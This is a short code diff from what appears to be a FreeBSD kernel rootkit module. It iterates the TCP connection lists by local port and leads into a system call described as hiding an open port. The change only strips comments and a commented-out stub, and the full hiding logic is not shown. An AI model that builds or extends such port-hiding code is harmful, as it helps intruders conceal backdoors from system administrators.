@@ -17,8 +17,6 @@
 #include <netinet/tcp_var.h>
 
 
-
-//1
 static int iterate_ipi_listhead(u_int16_t lport) {
     struct inpcb *inpb;
     CK_LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
@@ -36,11 +34,7 @@ static int iterate_ipi_listhead(u_int16_t lport) {
       return 0;	
 }
 
-//2
-//NOTES what goes with what 
-//ignore for now, now sure what to do with it
-//inpcb -> inp_portlist
-//requires inpcb lock and ipi_hash_lock
+
 static int iterate_port_hash(u_int16_t lport) {
      //struct inpcb *inpb;
      struct inpcbport *inpb;
@@ -57,12 +51,6 @@ static int iterate_port_hash(u_int16_t lport) {
       return 0;
 }
 
-//This will cause issues with the ability for the port to send data
-/*
-static int iterate_hash(u_int16_t lport){
-    return 0;
-}	
-*/
 
 /* System call to hide an open port. */
 int port_hiding(int lport) {
